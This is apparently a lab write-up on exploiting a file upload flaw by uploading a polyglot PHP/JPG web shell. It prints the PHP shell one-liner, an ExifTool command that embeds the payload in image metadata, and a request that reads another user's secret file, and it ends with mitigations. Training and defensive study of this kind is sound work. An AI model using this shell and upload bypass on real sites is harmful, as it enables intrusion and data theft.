# Writeup: Completing the File Upload Lab - Remote Code Execution via Polyglot Web Shell Upload

## **Overview**
This lab demonstrates how to exploit a vulnerable file upload functionality by crafting a polyglot file that bypasses content validation and executes server-side code. The goal is to retrieve a secret stored in the server and submit it to solve the lab.

---

## **Steps to Solve the Lab**

### 1. **Preparation**
- Logged into the application using the provided credentials:
  ```
  Username: wiener
  Password: peter
  ```

### 2. **Creating the Web Shell**
- Created a PHP script named `exploit.php` containing the following code:
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- Attempted to upload this script as an avatar but observed that the server blocked non-image files.

### 3. **Crafting a Polyglot File**
- Created a polyglot PHP/JPG file by embedding the PHP payload into the metadata of a valid image file:
  - Downloaded and installed **ExifTool**.
  - Ran the following command to add the payload to the image's `Comment` field and save it as `webshell.php`:
  ```php
  exiftool -comment="<?php echo 'FUCK OFF'. system($_GET['cmd']) .'HAHA'; ?>" escaltor.PNG -o webshell.php
  ```
- This created a valid image file (`webshell.php`) that included the PHP payload in its metadata and used the `.php` extension.

### 4. **Uploading the Polyglot File**
- Uploaded the crafted `webshell.php` as the avatar.
- Observed that the upload was successful despite the server's content validation checks.

### 5. **Executing the Web Shell**
- Used Burp Suite to locate the GET request for the uploaded file:
  ```
  GET /files/avatars/webshell.php?cmd=cat+/home/carlos/secret
  ```
- Sent this request in Burp Repeater.
- Observed the response, which contained binary image data.

### 6. **Extracting the Secret**
- Used Burp Suite's search feature to locate the `START` and `END` markers in the response.
- Found Carlos's secret string between these markers. Example:
  ```
  START 42uXE0jNpsKYwWmYq32Py1pz4D3BNpSC END
  ```

### 7. **Submitting the Secret**
- Submitted the retrieved secret using the button in the lab banner to solve the lab.

---

## **Explanation of the Exploit**
- **Why the payload worked:**
  - The polyglot file is a valid image that bypasses the server's content validation.
  - The server processes the PHP code embedded in the image's metadata due to the `.php` extension, enabling remote code execution.

- **Key technique:**
  - Using ExifTool to embed the PHP payload into a legitimate image ensures the file passes validation checks while retaining executable PHP code.

---

![Remote Code Execution via Polyglot Web Shell Upload Lab6](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab6a.PNG)


![Remote Code Execution via Polyglot Web Shell Upload Lab6](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab6b.PNG)


![Remote Code Execution via Polyglot Web Shell Upload Lab6](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab6c.PNG)


## **Conclusion**
This lab highlights the risks of improperly implemented file validation mechanisms. Proper mitigations include:
- Strictly validating file content and extensions.
- Sanitizing metadata to remove executable code.
- Disabling the execution of uploaded files.

By following these steps, the lab was successfully completed.
